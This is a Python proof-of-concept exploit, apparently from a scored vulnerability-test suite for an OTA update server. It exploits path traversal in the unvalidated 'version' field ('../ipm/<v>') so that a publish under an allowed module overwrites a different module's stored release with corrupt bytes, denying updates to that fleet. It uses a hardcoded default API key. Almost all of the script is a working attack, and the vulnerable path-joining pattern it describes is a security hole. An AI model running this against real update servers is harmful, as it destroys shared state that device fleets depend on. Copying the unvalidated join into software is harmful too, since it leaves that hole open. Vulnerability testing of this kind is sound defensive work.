#!/usr/bin/env python3
"""
PoC #5: Path traversal via the "version" field -> fleet-wide update DoS
----------------------------------------------------------------------
handlePublish() (publish.go) validates manifest.Module against a fixed
allowlist (fmm/ipm/log) before ever touching the filesystem - the "arbitrary
modules" boundary this fleet is supposed to enforce. But packagePath() joins
BOTH Module and Version into the storage path
(filepath.Join(dataDir, "packages", module, version)), and Version is never
validated at all. A publish claiming module="log" with a Version containing
"../" segments resolves outside log's own directory and lands inside a
DIFFERENT, allowed module's directory - overwriting that module's already
stored package bytes even though the publish never named it and carried no
authorization for it.

Scoreable impact (DoS by destroying shared persistent state): the artifact a
whole module's fleet pulls as its advertised release is shared state every one
of that module's devices depends on. This PoC publishes a legitimate ipm
release, confirms a normal consumer can download and open it (the exact
"download latest, then tarfile.open" step every ota-agent.sh performs), then -
through a publish that names module="log", never "ipm" - overwrites ipm's
stored package with bytes that are not a valid archive at all. It re-runs the
same consumer path a SEPARATE device would: ipm's advertised latest now hands
back an unusable package that no agent can extract, so the whole ipm fleet is
denied a working update. Confirmation is by that consumer's failure, not by the
attacker reading back its own bytes - the cross-module write destroyed state
every ipm caller relies on.

The downgrade/rollback angle rides the same missing validation (Store.SetLatest
overwrites latest[module] with no monotonicity check), but that's a state change
with no independent scoreable impact, so it isn't its own PoC - see
vuln_tests/README.md.

Run: python3 05_module_version_traversal.py [host] [port]
"""
import hashlib
import io
import json
import os
import sys
import tarfile
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
BASE = f"http://{HOST}:{PORT}"
API_KEY = os.environ.get("OTA_API_KEY") or "ota-default-key-2024"


def make_targz(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in entries:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def publish(manifest, payload):
    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", payload)
    req = urllib.request.Request(f"{BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Api-Key", API_KEY)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def consumer_can_apply(module, version):
    """Do exactly what a fleet device's ota-agent.sh does: download the
    module's package for this version and open it as a tar.gz. Returns
    (ok, detail) - ok is True only if the bytes are a usable archive."""
    try:
        with urllib.request.urlopen(f"{BASE}/updates/{module}/{version}/package", timeout=10) as r:
            data = r.read()
    except urllib.error.HTTPError as e:
        return False, f"download failed: {e.code}"
    try:
        with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tf:
            names = tf.getnames()
        return True, f"{len(data)} bytes, entries={names}"
    except (tarfile.TarError, OSError, EOFError) as e:
        return False, f"{len(data)} bytes, NOT a usable archive ({type(e).__name__}: {e})"


def main():
    version = f"9.9.9-{uuid.uuid4().hex[:8]}"

    # Step 1: a legitimate ipm release lands and becomes ipm's advertised latest.
    baseline = make_targz([("app/ipm-release.txt", b"legitimate ipm payload\n")])
    baseline_sha = hashlib.sha256(baseline).hexdigest()
    print(f"[*] Publishing a legitimate baseline: ipm {version}")
    m = {"module": "ipm", "version": version, "sha256": baseline_sha, "post_install": "none"}
    status, body = publish(m, baseline)
    print(f"[*] /publish (ipm) -> {status} {body}")
    if status == 401:
        # The API-key gate (vuln #2), not the traversal. This deployment set a
        # real OTA_API_KEY that this PoC didn't present.
        print("[-] Rejected at the API-key gate. Provide the deployment's OTA_API_KEY:")
        print("      OTA_API_KEY=<key> python3 05_module_version_traversal.py <host> <port>")
        print("    (the vuln_tests docker-compose passes it into the poc container for you.)")
        return 2
    if status != 201:
        print("[-] Could not publish the baseline")
        return 1

    # Step 2: baseline consumer proof - a normal ipm device can fetch + apply it.
    ok, detail = consumer_can_apply("ipm", version)
    print(f"[*] Bystander consumer fetch of ipm {version}: {'usable' if ok else 'UNUSABLE'} ({detail})")
    if not ok:
        print("[-] Baseline package wasn't a usable archive - test setup is off")
        return 1

    # Step 3: overwrite ipm's stored artifact through a publish that names "log".
    # module="log" is in the allowlist; version="../ipm/<v>" walks packagePath()
    # out of log/ and back into ipm/<v>, clobbering the file the ipm fleet pulls.
    # The payload is deliberately NOT a valid archive.
    corrupt = b"\x00CORRUPT-NOT-A-TARBALL-" + uuid.uuid4().hex.encode() + b"\x00" * 32
    corrupt_sha = hashlib.sha256(corrupt).hexdigest()
    evil_version = f"../ipm/{version}"
    print(f'[*] Publishing module="log" version="{evil_version}" (traversal in version, not module) '
          f"with non-archive bytes")
    em = {"module": "log", "version": evil_version, "sha256": corrupt_sha, "post_install": "none"}
    status, body = publish(em, corrupt)
    print(f"[*] /publish (log traversal) -> {status} {body}")
    if status != 201:
        print("[-] Traversal publish was rejected - version may now be validated (defended)")
        return 1

    # Step 4: the SAME consumer path a different ipm device would run, again.
    ok, detail = consumer_can_apply("ipm", version)
    print(f"[*] Bystander consumer re-fetch of ipm {version}: {'usable' if ok else 'UNUSABLE'} ({detail})")

    if not ok:
        print("[+] SCORED (DoS): a publish that named module=log, with no authorization for ipm, "
              "destroyed ipm's stored release artifact. Every ipm device now downloads its "
              "advertised latest and cannot extract it - shared state the whole ipm fleet "
              "depends on was wiped through an unvalidated version path.")
        return 0

    print("[-] ipm's package still opens cleanly - the cross-module overwrite did not land")
    return 1


if __name__ == "__main__":
    sys.exit(main())
